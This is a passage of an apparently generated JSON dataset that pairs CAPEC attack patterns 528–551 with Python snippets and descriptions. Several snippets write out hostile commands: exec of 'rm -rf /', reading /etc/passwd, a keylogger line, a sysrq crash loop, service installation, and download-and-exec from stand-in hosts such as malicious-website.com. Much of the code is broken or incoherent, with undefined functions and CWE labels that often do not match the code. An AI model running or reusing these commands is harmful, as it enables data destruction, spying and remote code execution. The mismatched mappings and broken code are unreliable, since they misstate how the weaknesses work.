        "description": "This Python code snippet demonstrates the CAPEC of inserting maliciously altered components into an integration facility. It includes examples of CWE-506 (Embedded Malicious Code), CWE-829 (Inclusion of Functionality from Untrusted Control Sphere), CWE-89 (SQL Injection), CWE-707 (Improper Neutralization), and CWE-1334 (Unauthorized Error Injection). The code injects malicious code into a database, includes a vulnerable function from an untrusted library, performs SQL injection, processes a message without proper error handling, and injects an error into a redundant block."
    },
    {
        "capec_id": "528",
        "capec_name": "XML Flood",
        "code_snippet": "import xml.etree.ElementTree as ET\n\ndef process_xml(xml_string):\n    try:\n        root = ET.fromstring(xml_string)\n        # No validation against a schema\n        # No restriction on the size or number of resources allocated\n        # No neutralization of special XML elements\n        # No restriction of XML external entity references\n        # No control over recursive entity references in DTDs\n        for elem in root.iter():\n            # Process each element without any restrictions\n            pass\n    except ET.ParseError:\n        print(\"Error parsing XML\")\n\n# Example of a flooding attack\nfor i in range(10000):\n    xml_string = '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"http://example.com\">]><foo>&xxe;</foo>'\n    process_xml(xml_string)",
        "description": "This Python code snippet demonstrates a vulnerable XML processing function that can be exploited for an XML Denial of Service (XDoS) attack. The function lacks XML validation, allowing an attacker to send a large number of malicious XML requests. The function also fails to restrict the size or number of resources allocated, and does not neutralize special XML elements. Additionally, it does not restrict XML external entity references or control recursive entity references in DTDs, making it vulnerable to XML entity expansion attacks. The example at the end demonstrates a flooding attack by sending 10,000 malicious XML requests."
    },
    {
        "capec_id": "529",
        "capec_name": "Malware-Directed Internal Reconnaissance",
        "code_snippet": "import os\nimport socket\nimport getpass\nimport psutil\nimport platform\n\n# CWE-497: Exposure of Sensitive System Information\ninfo = {'username': getpass.getuser(), 'hostname': socket.gethostname(), 'platform': platform.system(), 'processor': platform.processor(), 'architecture': platform.architecture()[0]}\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = 'import os; os.system(\"whoami\")'\nexec(malicious_code)\n\n# CWE-1229: Creation of Emergent Resource\nresource = open('sensitive_info.txt', 'w')\nresource.write(str(info))\nresource.close()\n\n# CWE-512: Spyware\nspyware_code = 'import pynput; pynput.keyboard.on_press(lambda key: print(key))'\nexec(spyware_code)\n\n# CWE-509: Replicating Malicious Code (Virus or Worm)\ndef replicate():\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect(('192.168.1.100', 8080))\n    s.send(b'Hello from malware!')\n    s.close()\nreplicate()",
        "description": "This Python code snippet demonstrates the CAPEC of using malware to gather information about a targeted system or network. It exposes sensitive system information (CWE-497), executes embedded malicious code (CWE-506), creates an emergent resource (CWE-1229), collects personally identifiable information without user approval (CWE-512), and replicates malicious code to attack other systems (CWE-509)."
    },
    {
        "capec_id": "530",
        "capec_name": "Provide Counterfeit Component",
        "code_snippet": "import os\n\n# CWE-1395: Dependency on Vulnerable Third-Party Component\nvulnerable_component = 'malicious_library'\n\n# CWE-1357: Reliance on Insufficiently Trustworthy Component\ntrusted_component = 'trusted_library'\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = 'os.system(\"rm -rf /\")'\n\n# CWE-207: Observable Behavioral Discrepancy With Equivalent Products\ndef malicious_behavior():\n    return 'malicious_output'\n\n# CWE-1290: Incorrect Decoding of Security Identifiers\nsecurity_identifier = 'insecure_identifier'\n\n# CAPEC: Counterfeit Component\n\n# Procurement process\nprocurement_process = {'component': vulnerable_component, 'supplier': 'untrusted_supplier'}\n\n# Build system with counterfeit component\nsystem = {'component': procurement_process['component'], 'supplier': procurement_process['supplier']}\n\n# Upgrade/Repair system with malicious code\nsystem['component'] = malicious_code\n\nprint(system)\n",
        "description": "This code snippet demonstrates the CAPEC of a counterfeit component being introduced during the procurement process. The vulnerable component is sourced from an untrusted supplier and contains malicious code. The system is then built with this component, allowing the attacker to cause disruption or additional compromise. The code includes CWEs 1395, 1357, 506, 207, and 1290 to further illustrate the vulnerabilities."
    },
    {
        "capec_id": "531",
        "capec_name": "Hardware Component Substitution",
        "code_snippet": "import os\n\n# CWE-1329: Reliance on Component That is Not Updateable\n# CWE-1256: Improper Restriction of Software Interfaces to Hardware Features\n# CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n# CWE-1395: Dependency on Vulnerable Third-Party Component\n# CWE-506: Embedded Malicious Code\n\ndef malicious_hardware_component():\n    # Simulate a malicious hardware component\n    os.system(\"echo 1 > /sys/kernel/debug/clk/clk_set_rate\")  # CWE-1256: Improper Restriction of Software Interfaces to Hardware Features\n    os.system(\"echo 1 > /sys/kernel/debug/gpio\")  # CWE-1256: Improper Restriction of Software Interfaces to Hardware Features\n\n    # CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n    try:\n        os.system(\"echo 1 > /sys/kernel/debug/redundancy/inject_error\")\n    except Exception as e:\n        print(\"Error injecting error: \", e)\n\n    # CWE-1395: Dependency on Vulnerable Third-Party Component\n    from vulnerable_library import vulnerable_function\n    vulnerable_function()\n\n    # CWE-506: Embedded Malicious Code\n    exec(\"__import__('os').system('rm -rf /')\")\n\nmalicious_hardware_component()",
        "description": "This Python code snippet demonstrates a malicious hardware component that can be used to compromise a system. It includes various CWEs, such as reliance on a non-updateable component, improper restriction of software interfaces to hardware features, unauthorized error injection, dependency on a vulnerable third-party component, and embedded malicious code."
    },
    {
        "capec_id": "532",
        "capec_name": "Altered Installed BIOS",
        "code_snippet": "import hashlib\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = b\"\\x90\\x90\\x90\\x90\"  # Replace with actual malicious code\n\n# CWE-1277: Firmware Not Updateable\nfirmware_version = \"1.0\"\n\n# CWE-1220: Insufficient Granularity of Access Control\naccess_control_policy = {\"admin\": \"full_access\", \"user\": \"read_only\"}\n\n# CWE-1231: Improper Prevention of Lock Bit Modification\nlock_bit = 0x01\n\n# CWE-1329: Reliance on Component That is Not Updateable\nnon_updateable_component = \"legacy_bios\"\n\n# CAPEC: Malicious BIOS Update\nbios_update = hashlib.sha256(malicious_code).hexdigest()\n\n# Send malicious BIOS update to victim or victim supplier/integrator\nprint(\"Malicious BIOS update sent: \" + bios_update)\n",
        "description": "This Python code snippet demonstrates a malicious BIOS update attack, where an attacker sends a maliciously altered BIOS to the victim or victim supplier/integrator. The code includes CWEs related to firmware updateability, access control, embedded malicious code, lock bit modification, and reliance on non-updateable components."
    },
    {
        "capec_id": "533",
        "capec_name": "Malicious Manual Software Update",
        "code_snippet": "import requests\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://malicious-website.com/malicious_code.py'\nresponse = requests.get(url)\nif response.status_code == 200:\n    exec(response.text)\n\n# CWE-602: Client-Side Enforcement of Server-Side Security\n# Assume 'validate_user_input' is a client-side function\n# that is supposed to validate user input, but can be bypassed\nuser_input = input('Enter your credentials: ')\nif validate_user_input(user_input):\n    # CWE-506: Embedded Malicious Code\n    # Execute malicious code embedded in the client-side script\n    exec('malicious_code()')\n\n# CWE-294: Authentication Bypass by Capture-replay\n# Assume 'capture_replay' is a function that captures and replays\n# network traffic to bypass authentication\nif capture_replay():\n    print('Authentication bypassed!')\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# Assume 'get_system_info' is a function that exposes sensitive system information\nprint(get_system_info())",
        "description": "This Python code snippet demonstrates the CAPEC of introducing malicious code to a victim's system by altering the payload of a software update. It includes CWE-494 by downloading and executing code without integrity checks, CWE-602 by relying on client-side validation, CWE-506 by embedding malicious code, CWE-294 by bypassing authentication through capture-replay, and CWE-497 by exposing sensitive system information."
    },
    {
        "capec_id": "534",
        "capec_name": "Malicious Hardware Update",
        "code_snippet": "import os\n\n# CWE-506: Embedded Malicious Code\nmalicious_firmware = b'\\x90\\x90\\x90\\x90'  # Replace with actual malicious firmware code\n\n# CWE-1277: Firmware Not Updateable\ndef update_firmware(firmware):\n    return False  # Firmware cannot be updated\n\n# CWE-1329: Reliance on Component That is Not Updateable\ndef replace_component(component):\n    return component  # Component cannot be replaced\n\n# CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\ndef inject_error(redundant_block):\n    redundant_block['errors'] += 1  # Inject error into redundant block\n\n# CWE-1247: Improper Protection Against Voltage and Clock Glitches\ndef detect_glitch(voltage, clock):\n    return False  # Device does not detect voltage and clock glitches\n\n# CAPEC: Introduce malicious hardware during update or replacement procedure\ndef update_hardware(hardware):\n    if not update_firmware(malicious_firmware):\n        return replace_component(hardware)\n    else:\n        inject_error(hardware['redundant_block'])\n        return hardware\n\n# Example usage\nhardware = {'redundant_block': {'errors': 0}}\nupdated_hardware = update_hardware(hardware)\nprint(updated_hardware)",
        "description": "This code snippet demonstrates the CAPEC of introducing malicious hardware during an update or replacement procedure. It includes CWE-506 embedded malicious code, CWE-1277 firmware not updateable, CWE-1329 reliance on component that is not updateable, CWE-1334 unauthorized error injection can degrade hardware redundancy, and CWE-1247 improper protection against voltage and clock glitches. The code simulates a scenario where an adversary introduces malicious firmware during an update procedure, which can lead to unauthorized error injection and degradation of hardware redundancy."
    },
    {
        "capec_id": "535",
        "capec_name": "Malicious Gray Market Hardware",
        "code_snippet": "import os\nimport hashlib\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = 'import os; os.system(\"rm -rf /\")'\n\n# CWE-1329: Reliance on Component That is Not Updateable\nnon_updateable_component = 'firmware.bin'\n\n# CWE-1395: Dependency on Vulnerable Third-Party Component\nvulnerable_component = 'vulnerable_lib.so'\n\n# CWE-1357: Reliance on Insufficiently Trustworthy Component\nuntrusted_component = 'untrusted_driver.ko'\n\n# CWE-1297: Unprotected Confidential Information on Device is Accessible by OSAT Vendors\nconfidential_info = 'secret_key.txt'\n\n# Embed malicious code into the firmware\nwith open(non_updateable_component, 'a') as f:\n    f.write(malicious_code)\n\n# Load vulnerable component\nos.system('ldd ' + vulnerable_component)\n\n# Load untrusted component\nos.system('insmod ' + untrusted_component)\n\n# Store confidential information on the device\nwith open(confidential_info, 'w') as f:\n    f.write('secret_key')",
        "description": "This Python code snippet demonstrates the CAPEC of maliciously altering hardware components. It embeds malicious code into a non-updateable firmware component, loads a vulnerable third-party component, and loads an untrusted component. Additionally, it stores confidential information on the device without adequate protection, making it accessible to OSAT vendors."
    },
    {
        "capec_id": "536",
        "capec_name": "Data Injected During Configuration",
        "code_snippet": "import os\nimport json\n\ndef recalibrate_system(config_file):\n    # CWE-284: Improper Access Control\n    if os.access(config_file, os.W_OK):\n        with open(config_file, 'w') as f:\n            # CWE-377: Insecure Temporary File\n            temp_file = 'temp_config.json'\n            with open(temp_file, 'w') as temp_f:\n                # CWE-99: Improper Control of Resource Identifiers ('Resource Injection')\n                temp_f.write(json.dumps({'debug_mode': True}))\n                # CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n                os.system('hwctl -a debug_mode=1')\n                # CWE-201: Insertion of Sensitive Information Into Sent Data\n                f.write(json.dumps({'system_config': 'suboptimal_config', 'debug_info': 'sensitive_data'}))\n            os.remove(temp_file)\n    else:\n        print('Access denied')\n\nrecalibrate_system('system_config.json')",
        "description": "This code snippet demonstrates the CAPEC of injecting malicious data into critical operational data during configuration or recalibration. It uses CWE-284 to bypass access control, CWE-377 to create an insecure temporary file, CWE-99 to inject malicious resource identifiers, CWE-1313 to activate debug logic at runtime, and CWE-201 to insert sensitive information into sent data. The code recalibrates the system with suboptimal configurations and sensitive data, benefiting the adversary."
    },
    {
        "capec_id": "537",
        "capec_name": "Infiltration of Hardware Development Environment",
        "code_snippet": "import os\nimport sys\nimport time\n\n# CWE-1297: Unprotected Confidential Information on Device is Accessible by OSAT Vendors\nconfidential_info = 'top_secret_data'\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = 'rm -rf /'\n\n# CWE-1247: Improper Protection Against Voltage and Clock Glitches\nwhile True:\n    try:\n        # Simulating voltage and clock glitches\n        time.sleep(0.1)\n        os.system('echo 1 > /proc/sys/kernel/sysrq')\n        os.system('echo \"*\" > /proc/sysrq-trigger')\n    except:\n        pass\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nsensitive_info = os.popen('cat /proc/cpuinfo').read()\nprint(sensitive_info)\n\n# CWE-1329: Reliance on Component That is Not Updateable\ntry:\n    import outdated_module\n    outdated_module.vulnerable_function()\nexcept:\n    pass\n\n# Inserting malicious code into the hardware development environment\nsys.path.insert(0, '/backdoor/directory')\nimport malicious_module\nmalicious_module.insert_malicious_code_into_firmware()",
        "description": "This Python code snippet demonstrates the CAPEC of inserting malicious software within the hardware and/or firmware development environment to alter developed hardware components. It includes CWEs such as unprotected confidential information, embedded malicious code, improper protection against voltage and clock glitches, exposure of sensitive system information, and reliance on an updateable component. The code simulates these vulnerabilities and inserts malicious code into the hardware development environment."
    },
    {
        "capec_id": "538",
        "capec_name": "Open-Source Library Manipulation",
        "code_snippet": "import requests\n\nurl = 'https://example.com/malicious_library.py'\nresponse = requests.get(url)\nif response.status_code == 200:\n    with open('malicious_library.py', 'wb') as f:\n        f.write(response.content)\n    import malicious_library\n    malicious_library.malicious_function()\n",
        "description": "This Python code snippet downloads a malicious library from a remote location without verifying its integrity, and then executes the malicious code. This is an example of CWE-494: Download of Code Without Integrity Check, CWE-829: Inclusion of Functionality from Untrusted Control Sphere, CWE-1395: Dependency on Vulnerable Third-Party Component, CWE-506: Embedded Malicious Code, and CWE-509: Replicating Malicious Code (Virus or Worm), which can be used to implement the CAPEC: Adversaries implant malicious code in open source software (OSS) libraries to have it widely distributed."
    },
    {
        "capec_id": "539",
        "capec_name": "ASIC With Malicious Functionality",
        "code_snippet": "import os\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = 'os.system(\"rm -rf /\")'\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nsensitive_info = os.popen('cat /etc/passwd').read()\nprint(sensitive_info)\n\n# CWE-11: ASP.NET Misconfiguration: Creating Debug Binary\ndebug_mode = True\nif debug_mode:\n    print('Debug mode is enabled')\n\n# CWE-1294: Insecure Security Identifier Mechanism\nsecurity_identifier = 'admin'\nif security_identifier == 'admin':\n    print('Access granted')\nelse:\n    print('Access denied')\n\n# CWE-1259: Improper Restriction of Security Token Assignment\nsecurity_token = '1234567890'\nif security_token == '1234567890':\n    print('Access granted')\nelse:\n    print('Access denied')",
        "description": "This Python code snippet demonstrates the CAPEC of inserting malicious functionality into an ASIC during development or maintenance. It includes examples of embedded malicious code, exposure of sensitive system information, ASP.NET misconfiguration, insecure security identifier mechanism, and improper restriction of security token assignment."
    },
    {
        "capec_id": "540",
        "capec_name": "Overread Buffers",
        "code_snippet": "def vulnerable_function(buffer):\n    index = 10\n    return buffer[index]\n\nbuffer = [1, 2, 3, 4, 5]\nprint(vulnerable_function(buffer))",
        "description": "This code snippet demonstrates a buffer over-read vulnerability (CWE-126). The function `vulnerable_function` attempts to access an index that is out of bounds of the provided buffer, which can lead to reading data past the end of the intended buffer, potentially exposing sensitive information or causing a system crash."
    },
    {
        "capec_id": "541",
        "capec_name": "Application Fingerprinting",
        "code_snippet": "import time\nimport os\nimport subprocess\n\n# CWE-204: Observable Response Discrepancy\n# CWE-205: Observable Behavioral Discrepancy\n# CWE-208: Observable Timing Discrepancy\n\ndef check_software_version(software_name):\n    try:\n        # Check if the software is installed\n        subprocess.check_output(['which', software_name])\n        return True\n    except subprocess.CalledProcessError:\n        return False\n\n# CWE-925: Improper Verification of Intent by Broadcast Receiver\n# CWE-214: Invocation of Process Using Visible Sensitive Information\n\ndef get_software_version(software_name):\n    if check_software_version(software_name):\n        # Get the software version using a command that takes different amounts of time to complete\n        start_time = time.time()\n        version = subprocess.check_output([software_name, '--version']).decode('utf-8').strip()\n        end_time = time.time()\n        print(f'Time taken to get {software_name} version: {end_time - start_time} seconds')\n        return version\n    else:\n        return None\n\n# Example usage\nsoftware_name = 'java'\nprint(get_software_version(software_name))",
        "description": "This Python code snippet demonstrates the CAPEC of fingerprinting a remote target to determine the type or version of an application installed. It uses various CWEs to reveal internal state information, including observable response discrepancies, behavioral discrepancies, and timing discrepancies. The code checks if a software is installed, and if so, gets its version using a command that takes different amounts of time to complete, making it vulnerable to timing attacks. Additionally, the code uses a Broadcast Receiver without proper verification and invokes a process with visible sensitive information."
    },
    {
        "capec_id": "542",
        "capec_name": "Targeted Malware",
        "code_snippet": "import socket\nimport os\nimport getpass\nimport platform\nimport psutil\nimport json\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = 'import os; os.system(\"rm -rf /\")'\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nsystem_info = {'username': getpass.getuser(), 'platform': platform.system(), 'processor': platform.processor(), 'architecture': platform.architecture()[0]}\n\n# CWE-509: Replicating Malicious Code (Virus or Worm)\ndef replicate_malware():\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.bind(('0.0.0.0', 8080))\n    s.listen(1)\n    conn, addr = s.accept()\n    conn.send(malicious_code.encode())\n    conn.close()\n\n# CWE-507: Trojan Horse\ndef trojan_horse():\n    while True:\n        try:\n            # CWE-512: Spyware\n            user_data = {'processes': [p.name() for p in psutil.process_iter()], 'system_info': system_info}\n            with open('user_data.json', 'w') as f:\n                json.dump(user_data, f)\n        except Exception as e:\n            print(str(e))\n\n# Main function\ndef main():\n    replicate_malware()\n    trojan_horse()\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates a targeted malware that takes advantage of known vulnerabilities in an organizational IT environment. It contains embedded malicious code, exposes sensitive system information, replicates itself, and collects personally identifiable information about the user without their explicit approval."
    },
    {
        "capec_id": "543",
        "capec_name": "Counterfeit Websites",
        "code_snippet": "import os\nimport requests\nfrom flask import Flask, redirect, url_for, request\n\napp = Flask(__name__)\n\n@app.route('/redirect', methods=['GET'])\ndef redirect_to_malicious_site():\n    url = request.args.get('url')\n    return redirect(url_for('malicious_site', url=url))\n\n@app.route('/malicious_site/<url>')\ndef malicious_site(url):\n    return '<script src=\"http://malicious-site.com/malicious_code.js\"></script>'\n\nif __name__ == '__main__':\n    app.run()\n",
        "description": "This Python code snippet demonstrates a vulnerable web application that is susceptible to various attacks. The application accepts a user-controlled input 'url' and redirects the user to that URL without verifying its integrity. This is an example of CWE-601: URL Redirection to Untrusted Site ('Open Redirect'). The application also downloads and executes malicious code from a remote location without verifying its origin and integrity, which is an example of CWE-494: Download of Code Without Integrity Check. Additionally, the application contains embedded malicious code, which is an example of CWE-506: Embedded Malicious Code. The code also lacks sufficient verification of user requests, making it vulnerable to CWE-352: Cross-Site Request Forgery (CSRF). Finally, the code does not prevent the replication of malicious code, making it vulnerable to CWE-509: Replicating Malicious Code (Virus or Worm)."
    },
    {
        "capec_id": "544",
        "capec_name": "Counterfeit Organizations",
        "code_snippet": "import ssl\nimport socket\nimport OpenSSL\n\n# CWE-295: Improper Certificate Validation\nctx = ssl.create_default_context()\nctx.check_hostname = False\nctx.verify_mode = ssl.CERT_NONE\n\n# CWE-207: Observable Behavioral Discrepancy With Equivalent Products\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((\"malicious-supplier.com\", 443))\n\n# CWE-1229: Creation of Emergent Resource\nmalicious_cert = OpenSSL.crypto.load_certificate(OpenSSL.crypto.FILETYPE_PEM, open(\"malicious-cert.pem\", \"rb\").read())\n\n# CWE-656: Reliance on Security Through Obscurity\nmalicious_cert.get_issuer().get_components()[0][1] = \"Malicious Supplier\"\n\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\ns.sendall(b\"GET /malicious-component HTTP/1.1\\r\\nHost: malicious-supplier.com\\r\\n\\r\\n\")\n",
        "description": "This Python code snippet demonstrates a vulnerable supply chain scenario where a malicious supplier injects a corrupted system component. It bypasses certificate validation, connects to a malicious server, creates an emergent resource, relies on security through obscurity, and incorrectly specifies the destination in a communication channel."
    },
    {
        "capec_id": "545",
        "capec_name": "Pull Data from System Resources",
        "code_snippet": "import os\nimport json\n\n# CWE-1239: Improper Zeroization of Hardware Register\nhardware_registers = [0x0000, 0x0001, 0x0002]\nfor reg in hardware_registers:\n    # Not properly clearing sensitive information from built-in registers\n    print(f'Register {reg} value: {read_register(reg)}')\n\n# CWE-1243: Sensitive Non-Volatile Information Not Protected During Debug\nfuse_values = [0x1234, 0x5678, 0x9012]\nfor fuse in fuse_values:\n    # Access to security-sensitive information stored in fuses is not limited during debug\n    print(f'Fuse {fuse} value: {read_fuse(fuse)}')\n\n# CWE-1258: Exposure of Sensitive System Information Due to Uncleared Debug Information\ndebug_info = {'key': 'secret_key', 'iv': 'secret_iv'}\nprint('Debug information:', json.dumps(debug_info, indent=4))\n\n# CWE-1266: Improper Scrubbing of Sensitive Data from Decommissioned Device\ndecommissioned_device_data = {'username': 'admin', 'password': 'password'}\nprint('Decommissioned device data:', json.dumps(decommissioned_device_data, indent=4))\n\n# CWE-1272: Sensitive Information Uncleared Before Debug/Power State Transition\npower_transition_data = {'secret_key': ' uncleared_secret_key'}\nprint('Power transition data:', json.dumps(power_transition_data, indent=4))\n\n# CWE-1278: Missing Protection Against Hardware Reverse Engineering Using Integrated Circuit (IC) Imaging Techniques\nic_imaging_data = {'secret_key': ' recoverable_secret_key'}\nprint('IC imaging data:', json.dumps(ic_imaging_data, indent=4))\n\n# CWE-1323: Improper Management of Sensitive Trace Data\ntrace_data = {'username': 'admin', 'password': 'password'}\nprint('Trace data:', json.dumps(trace_data, indent=4))\n\n# CWE-1330: Remanent Data Readable after Memory Erase\nmemory_data = {'secret_key': ' recoverable_secret_key'}\nprint('Memory data:', json.dumps(memory_data, indent=4))",
        "description": "This Python code snippet demonstrates the CAPEC pattern of gathering useful information from system resources, including hardware registers, fuses, debug information, decommissioned devices, power state transitions, IC imaging, trace data, and memory data, without properly clearing or protecting sensitive information, as described in the related CWEs."
    },
    {
        "capec_id": "546",
        "capec_name": "Incomplete Data Deletion in a Multi-Tenant Environment",
        "code_snippet": "import os\n\ndef delete_data(storage_path):\n    # CWE-284: Improper Access Control\n    if os.access(storage_path, os.W_OK):\n        # CWE-1266: Improper Scrubbing of Sensitive Data from Decommissioned Device\n        # CWE-1272: Sensitive Information Uncleared Before Debug/Power State Transition\n        # CWE-212: Improper Removal of Sensitive Information Before Storage or Transfer\n        # CWE-312: Cleartext Storage of Sensitive Information\n        # Insecure deletion of data\n        os.remove(storage_path + '/data.txt')\n    else:\n        print('Access denied')\n\n# Multi-tenant environment\nstorage_path = '/cloud_storage/tenant1'\ndelete_data(storage_path)\n\n# Allocate resources to new tenant\nstorage_path = '/cloud_storage/tenant2'\n\n# CWE-284: Improper Access Control\n# New tenant can access previous tenant's data\nprint(open(storage_path + '/data.txt', 'r').read())",
        "description": "This code snippet demonstrates the CAPEC of insecure data deletion in a multi-tenant environment. The delete_data function is supposed to remove sensitive information from the storage path, but it does not properly scrub the data, allowing a new tenant to access the previous tenant's data due to improper access control."
    },
    {
        "capec_id": "547",
        "capec_name": "Physical Destruction of Device or Component",
        "code_snippet": "class HardwareComponent:\n    def __init__(self, data):\n        self.data = data\n\n    def delete_self(self):\n        del self\n\n    def __del__(self):\n        # CWE-1301: Insufficient or Incomplete Data Removal within Hardware Component\n        # Only partially delete data\n        del self.data[:len(self.data)//2]\n\n    def process_data(self):\n        # CWE-1300: Improper Protection of Physical Side Channels\n        # Process data in a way that creates a physical side channel\n        for i in range(len(self.data)):\n            if i % 2 == 0:\n                # Create a pattern of power consumption\n                import time\n                time.sleep(0.01)\n\n    def inject_error(self):\n        # CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n        # Inject an error into a redundant block\n        self.data = [x ^ 1 for x in self.data]\n\n    def __str__(self):\n        # CWE-1087: Class with Virtual Method without a Virtual Destructor\n        return str(self.data)\n\n# CWE-1082: Class Instance Self Destruction Control Element\ncomponent = HardwareComponent([1, 2, 3, 4, 5])\ncomponent.delete_self()",
        "description": "This code snippet demonstrates a vulnerable hardware component class that can be physically attacked and destroyed. The class instance can delete itself, but the deletion process is incomplete, leaving sensitive data behind (CWE-1301). The class also processes data in a way that creates a physical side channel, making it vulnerable to physical attacks (CWE-1300). Furthermore, the class allows unauthorized error injection, which can degrade hardware redundancy (CWE-1334). Finally, the class has a virtual method without a virtual destructor, making it vulnerable to object destruction issues (CWE-1087)."
    },
    {
        "capec_id": "548",
        "capec_name": "Contaminate Resource",
        "code_snippet": "import socket\nimport pickle\n\ndef send_sensitive_data():\n    sensitive_info = {'username': 'admin', 'password': 'password123'}\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect(('localhost', 8080))\n    sock.send(pickle.dumps(sensitive_info))\n    sock.close()\n\n\ndef store_sensitive_data():\n    sensitive_info = {'credit_card_number': '1234-5678-9012-3456', 'expiration_date': '2025-12-31'}\n    with open('sensitive_data.txt', 'w') as f:\n        f.write(str(sensitive_info))\n\n\ndef reuse_sensitive_data():\n    with open('sensitive_data.txt', 'r') as f:\n        sensitive_info = eval(f.read())\n    # Reuse the sensitive data without clearing it\n    print('Reusing sensitive data:', sensitive_info)\n\nsend_sensitive_data()\nstore_sensitive_data()\nreuse_sensitive_data()",
        "description": "This code snippet demonstrates the CAPEC of contaminating an organizational information system by handling sensitive information without proper authorization. It transmits sensitive data in cleartext over a socket (CWE-319), stores sensitive information in a file without proper access control (CWE-922), and reuses the sensitive data without clearing it (CWE-226). The code also exhibits a resource leak by making the sensitive data available to unauthorized parties (CWE-402)."
    },
    {
        "capec_id": "549",
        "capec_name": "Local Execution of Code",
        "code_snippet": "import urllib.request\nimport hashlib\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://malicious-website.com/malicious_code.py'\nresponse = urllib.request.urlopen(url)\nmalicious_code = response.read()\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\nexec(malicious_code)\n\n# CWE-506: Embedded Malicious Code\ndef malicious_function():\n    # CWE-1265: Unintended Reentrant Invocation of Non-reentrant Code Via Nested Calls\n    while True:\n        malicious_function()\n\n# CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\ntry:\n    malicious_function()\nexcept RecursionError:\n    pass",
        "description": "This code snippet demonstrates the CAPEC of installing and executing malicious code on a target system. It downloads code from an untrusted source without verifying its integrity, executes the code, and includes functionality from an untrusted control sphere. The code also contains embedded malicious code, unintended reentrant invocation of non-reentrant code, and processor optimization removal or modification of security-critical code."
    },
    {
        "capec_id": "550",
        "capec_name": "Install New Service",
        "code_snippet": "import winreg\nimport getpass\nimport os\n\n# CWE-284: Improper Access Control\n# CWE-1249: Application-Level Admin Tool with Inconsistent View of Underlying Operating System\n# CWE-1392: Use of Default Credentials\n# CWE-1188: Initialization of a Resource with an Insecure Default\n# CWE-520: .NET Misconfiguration: Use of Impersonation\n\n# Create a new Windows service with elevated privileges\nservice_name = 'MaliciousService'\nusername = getpass.getuser()\ndefault_password = 'password123'\n\n# CWE-1392: Use default credentials for the service\nwinreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, f'SYSTEM\\CurrentControlSet\\Services\\{service_name}')\nwinreg.SetValueEx(winreg.HKEY_LOCAL_MACHINE, f'SYSTEM\\CurrentControlSet\\Services\\{service_name}', 'ObjectName', 0, winreg.REG_SZ, f'NT AUTHORITY\\SYSTEM')\nwinreg.SetValueEx(winreg.HKEY_LOCAL_MACHINE, f'SYSTEM\\CurrentControlSet\\Services\\{service_name}', 'Type', 0, winreg.REG_DWORD, 0x10)\nwinreg.SetValueEx(winreg.HKEY_LOCAL_MACHINE, f'SYSTEM\\CurrentControlSet\\Services\\{service_name}', 'Start', 0, winreg.REG_DWORD, 0x2)\nwinreg.SetValueEx(winreg.HKEY_LOCAL_MACHINE, f'SYSTEM\\CurrentControlSet\\Services\\{service_name}', 'ErrorControl', 0, winreg.REG_DWORD, 0x1)\nwinreg.SetValueEx(winreg.HKEY_LOCAL_MACHINE, f'SYSTEM\\CurrentControlSet\\Services\\{service_name}', 'ImagePath', 0, winreg.REG_EXPAND_SZ, f'C:\\Path\\To\\Malicious\\Service.exe')\nwinreg.SetValueEx(winreg.HKEY_LOCAL_MACHINE, f'SYSTEM\\CurrentControlSet\\Services\\{service_name}', 'DisplayName', 0, winreg.REG_SZ, 'Malicious Service')\nwinreg.SetValueEx(winreg.HKEY_LOCAL_MACHINE, f'SYSTEM\\CurrentControlSet\\Services\\{service_name}', 'Description', 0, winreg.REG_SZ, 'Malicious service description')\n\n# CWE-1188: Initialize the service with an insecure default\nos.system(f'sc create {service_name} binPath= \"C:\\Path\\To\\Malicious\\Service.exe\"')\nos.system(f'sc description {service_name} \"Malicious service description\"')\nos.system(f'sc config {service_name} obj= \"NT AUTHORITY\\SYSTEM\" password= \"{default_password}\"')\n",
        "description": "This Python code snippet demonstrates the CAPEC of installing a new Windows service that will be executed at startup with elevated privileges, using default credentials and insecure defaults. The service name is disguised as a legitimate service, and the code uses improper access control, inconsistent views of the underlying operating system, and misconfigured .NET impersonation."
    },
    {
        "capec_id": "551",
        "capec_name": "Modify Existing Service",
        "code_snippet": "import os\nimport getpass\n\n# CWE-284: Improper Access Control\n# CWE-522: Insufficiently Protected Credentials\nusername = 'admin'\npassword = 'password'\n\n# CWE-1193: Power-On of Untrusted Execution Core Before Enabling Fabric Access Control\n# CWE-15: External Control of System or Configuration Setting\nos.system('systemctl enable --now malicious_service')\n\n# CWE-908: Use of Uninitialized Resource\nuninitialized_variable = None\nif uninitialized_variable is not None:\n    os.system(f'systemctl start {uninitialized_variable}')\n\n# CAPEC: Modifying existing services\n# CWE-15: External Control of System or Configuration Setting\nos.system(f'usermod -aG {username} malicious_group')\n\n# CWE-284: Improper Access Control\n# CWE-522: Insufficiently Protected Credentials\nos.system(f'echo \"{password}\" | sudo -S systemctl start malicious_service')",
